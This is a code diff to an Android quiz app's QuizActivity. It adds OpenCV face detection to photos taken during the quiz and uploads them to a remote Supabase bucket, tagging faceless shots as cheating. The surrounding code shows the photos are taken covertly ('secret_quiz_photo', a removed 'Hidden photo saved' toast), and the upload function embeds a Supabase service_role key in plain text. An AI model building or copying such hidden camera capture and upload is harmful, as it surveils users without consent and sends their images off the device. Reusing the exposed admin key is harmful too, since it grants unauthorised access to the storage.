@@ -4,7 +4,10 @@ import android.Manifest;
 import android.annotation.SuppressLint;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.graphics.ImageFormat;
+import android.graphics.Matrix;
 import android.hardware.camera2.*;
 import android.media.Image;
 import android.media.ImageReader;
@@ -23,10 +26,18 @@ import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.FileProvider;
+import androidx.exifinterface.media.ExifInterface;
+
+import org.opencv.android.OpenCVLoader;
+import org.opencv.android.Utils;
+import org.opencv.core.Mat;
+import org.opencv.core.MatOfRect;
+import org.opencv.objdetect.CascadeClassifier;
 
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
+import java.io.InputStream;
 import java.nio.ByteBuffer;
 
 import okhttp3.Call;
@@ -58,6 +69,8 @@ public class QuizActivity extends AppCompatActivity {
     private CameraDevice cameraDevice;
     private Handler backgroundHandler;
     private ImageReader imageReader;
+    private CascadeClassifier faceDetector;
+
     private CameraCaptureSession captureSession;
     private CameraManager cameraManager;
     private String cameraId;
@@ -86,6 +99,28 @@ public class QuizActivity extends AppCompatActivity {
 
         startBackgroundThread();
         initCamera2();
+        if (!OpenCVLoader.initDebug()) {
+            Log.d("OpenCV", "Initialization failed");
+        } else {
+            try {
+                InputStream is = getResources().openRawResource(R.raw.haarcascade_frontalface_default);
+                File cascadeDir = getDir("cascade", MODE_PRIVATE);
+                File mCascadeFile = new File(cascadeDir, "haarcascade_frontalface_default.xml");
+                FileOutputStream os = new FileOutputStream(mCascadeFile);
+
+                byte[] buffer = new byte[4096];
+                int bytesRead;
+                while ((bytesRead = is.read(buffer)) != -1) {
+                    os.write(buffer, 0, bytesRead);
+                }
+                is.close();
+                os.close();
+
+                faceDetector = new CascadeClassifier(mCascadeFile.getAbsolutePath());
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
 
         btnNext.setOnClickListener(v -> {
             if (takingPhoto) return;
@@ -126,9 +161,8 @@ public class QuizActivity extends AppCompatActivity {
             progressBlood.setProgress(bloodScore);
 
             if (currentQuestion == 7) {
-                if (firstImage != null && secondImage != null) {
-                    Toast.makeText(this, "Comparing faces...", Toast.LENGTH_SHORT).show();
-                }
+
+
 
                 Intent intent;
                 if (bloodScore < 300) {
@@ -294,24 +328,6 @@ public class QuizActivity extends AppCompatActivity {
         }
     }
 
-    private void saveImageToFile(byte[] bytes) {
-        try {
-            File imageFile = createImageFile();
-            FileOutputStream fos = new FileOutputStream(imageFile);
-            fos.write(bytes);
-            fos.close();
-            runOnUiThread(() -> Toast.makeText(this, "Hidden photo saved", Toast.LENGTH_SHORT).show());
-
-            if (pictureCount == 0) firstImage = imageFile;
-            else if (pictureCount == 1) secondImage = imageFile;
-            pictureCount++;
-
-            uploadImageToSupabase(imageFile);
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-    }
-
     private File createImageFile() throws IOException {
         String fileName = "secret_quiz_photo_" + System.currentTimeMillis();
         File storageDir = new File(getExternalFilesDir(null), "quizphotos");
@@ -320,13 +336,75 @@ public class QuizActivity extends AppCompatActivity {
         }
         return File.createTempFile(fileName, ".jpg", storageDir);
     }
+    private Bitmap rotateBitmapIfRequired(Bitmap bitmap, String imagePath) {
+        try {
+            ExifInterface exif = new ExifInterface(imagePath);
+            int orientation = exif.getAttributeInt(ExifInterface.TAG_ORIENTATION, ExifInterface.ORIENTATION_NORMAL);
+            Matrix matrix = new Matrix();
 
-    private void uploadImageToSupabase(File imageFile) {
+            switch (orientation) {
+                case ExifInterface.ORIENTATION_ROTATE_90:
+                    matrix.postRotate(90);
+                    break;
+                case ExifInterface.ORIENTATION_ROTATE_180:
+                    matrix.postRotate(180);
+                    break;
+                case ExifInterface.ORIENTATION_ROTATE_270:
+                    matrix.postRotate(270);
+                    break;
+                default:
+                    return bitmap;
+            }
+
+            return Bitmap.createBitmap(bitmap, 0, 0, bitmap.getWidth(), bitmap.getHeight(), matrix, true);
+        } catch (IOException e) {
+            e.printStackTrace();
+            return bitmap;
+        }
+    }
+    private void saveImageToFile(byte[] bytes) {
+        try {
+            File imageFile = createImageFile();
+            FileOutputStream fos = new FileOutputStream(imageFile);
+            fos.write(bytes);
+            fos.close();
+
+            // Decode and fix rotation
+            Bitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
+            Bitmap rotatedBitmap = rotateBitmapIfRequired(bitmap, imageFile.getAbsolutePath());
+
+            // Convert to Mat for OpenCV face detection
+            Mat mat = new Mat();
+            Utils.bitmapToMat(rotatedBitmap, mat);
+
+            MatOfRect faces = new MatOfRect();
+            faceDetector.detectMultiScale(mat, faces);
+
+            runOnUiThread(() -> {
+                if (faces.toArray().length > 0) {
+                    String objectPath = "photos2/" + imageFile.getName();
+
+                    Toast.makeText(QuizActivity.this, "Face detected", Toast.LENGTH_SHORT).show();
+                    uploadImageToSupabase(imageFile,objectPath);
+                } else {
+                    String objectPath2 = "photocheating/" + imageFile.getName();
+                    Toast.makeText(QuizActivity.this, "You are cheating!", Toast.LENGTH_SHORT).show();
+                    uploadImageToSupabase(imageFile,objectPath2);
+                    finish();
+                }
+            });
+
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void uploadImageToSupabase(File imageFile,String objectPath) {
         OkHttpClient client = new OkHttpClient();
         String supabaseUrl = "https://nzfiiozondmzvdqxdrld.supabase.co";
         String bucketName = "images";
         String apiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im56Zmlpb3pvbmRtenZkcXhkcmxkIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc0NTE0MjIxNywiZXhwIjoyMDYwNzE4MjE3fQ.2d0GZGpYADZ985xNUpxWh3i7pHHun1WxkXn4QhX4g9A"; // Replace with your actual API Key
-        String objectPath = "photos2/" + imageFile.getName();
+
 
         RequestBody requestBody = RequestBody.create(imageFile, MediaType.parse("image/jpeg"));
         Request request = new Request.Builder()
